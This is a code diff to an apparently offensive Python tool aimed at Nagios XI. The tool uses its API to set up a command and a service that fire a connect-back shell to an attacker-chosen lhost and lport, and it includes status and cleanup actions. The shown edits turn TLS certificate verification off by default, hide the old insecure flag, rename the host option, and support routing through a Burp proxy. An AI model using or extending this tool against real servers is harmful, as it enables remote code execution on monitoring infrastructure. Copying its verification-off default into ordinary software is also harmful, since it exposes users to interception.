@@ -74,18 +74,18 @@ def build_command_line(lhost, lport):
 
 
 class XI:
-    def __init__(self, base_url, apikey, insecure=False, verbose=False, proxy=None):
+    def __init__(self, base_url, apikey, verify=False, verbose=False, proxy=None):
         self.base = base_url.rstrip("/")
         self.api = self.base + "/api/v1"
         self.apikey = apikey
         self.verbose = verbose
-        ctx = None
-        if insecure:
+        handlers = []
+        # TLS verification is OFF by default: labs use self-signed certs, and we
+        # want to proceed regardless. Pass verify=True to enforce it.
+        if not verify:
             ctx = ssl.create_default_context()
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
-        handlers = []
-        if ctx is not None:
             handlers.append(urllib.request.HTTPSHandler(context=ctx))
         # Explicit ProxyHandler: {} ignores HTTP(S)_PROXY env unless --proxy is
         # given, so traffic only goes through Burp when asked. An explicit dict
@@ -286,9 +286,9 @@ def print_next_steps(xi, args):
     log("CCM home     : %s" % ccm)
     log("CCM commands : %s?cmd=view&type=command  (find '%s')" % (ccm, args.command))
     log("CCM services : %s?cmd=view&type=service  (find '%s')" % (ccm, args.service))
-    log("check (cli)  : python3 %s status --url %s --host %s --service '%s' %s"
+    log("check (cli)  : python3 %s status --url %s --monitored-host %s --service '%s' %s"
         % (prog, args.url, args.host, args.service, auth))
-    log("cleanup      : python3 %s cleanup --url %s --host %s --service '%s' --command %s %s"
+    log("cleanup      : python3 %s cleanup --url %s --monitored-host %s --service '%s' --command %s %s"
         % (prog, args.url, args.host, args.service, args.command, auth))
     if args.username:
         log("               (cleanup/check prompt for the password, or set NAGIOSXI_PASS)")
@@ -301,7 +301,8 @@ def main():
         epilog="actions: setup | fire | status | cleanup | all")
     p.add_argument("action", choices=["setup", "fire", "status", "cleanup", "all"])
     p.add_argument("--url", default=os.environ.get("NAGIOSXI_URL", DEFAULT_URL),
-                   help="Nagios XI base URL (default %(default)s)")
+                   help="Nagios XI base URL, INCLUDING the /nagiosxi path "
+                        "e.g. http://TARGET/nagiosxi (default %(default)s)")
     p.add_argument("--apikey", default=os.environ.get("NAGIOSXI_APIKEY", DEFAULT_APIKEY),
                    help="Nagios XI API key (env NAGIOSXI_APIKEY)")
     p.add_argument("--username", default=os.environ.get("NAGIOSXI_USER"),
@@ -313,15 +314,19 @@ def main():
                    help="connect-back address, reachable from the Nagios "
                         "server (default %(default)s)")
     p.add_argument("--lport", type=int, default=DEFAULT_LPORT)
-    p.add_argument("--host", default=DEFAULT_HOST, help="host object to attach to")
+    p.add_argument("--monitored-host", "--host", dest="host", default=DEFAULT_HOST,
+                   help="existing Nagios host OBJECT to attach the service to "
+                        "(NOT the XI server address; e.g. localhost)")
     p.add_argument("--service", default=DEFAULT_SERVICE)
     p.add_argument("--command", default=DEFAULT_COMMAND)
     p.add_argument("--template", default=DEFAULT_TEMPLATE)
     p.add_argument("--contact-group", default=DEFAULT_CONTACT_GROUP)
     p.add_argument("--check-interval", type=int, default=5)
-    p.add_argument("-k", "--insecure", action="store_true",
-                   help="skip TLS verification (for https:// self-signed, "
-                        "and for intercepting https through Burp's CA)")
+    p.add_argument("--verify-tls", action="store_true",
+                   help="verify the server's TLS certificate (OFF by default; "
+                        "self-signed / unverifiable certs are accepted)")
+    # deprecated no-op: TLS verification is already off by default
+    p.add_argument("-k", "--insecure", action="store_true", help=argparse.SUPPRESS)
     p.add_argument("--proxy", default=os.environ.get("NAGIOSXI_PROXY"),
                    help="route API traffic through this proxy, "
                         "e.g. http://127.0.0.1:8081 (env NAGIOSXI_PROXY)")
@@ -342,7 +347,7 @@ def main():
     if args.burp and not proxy:
         proxy = "http://127.0.0.1:8080"
 
-    xi = XI(args.url, args.apikey, insecure=args.insecure,
+    xi = XI(args.url, args.apikey, verify=args.verify_tls,
             verbose=args.verbose, proxy=proxy)
     try:
         if args.username:
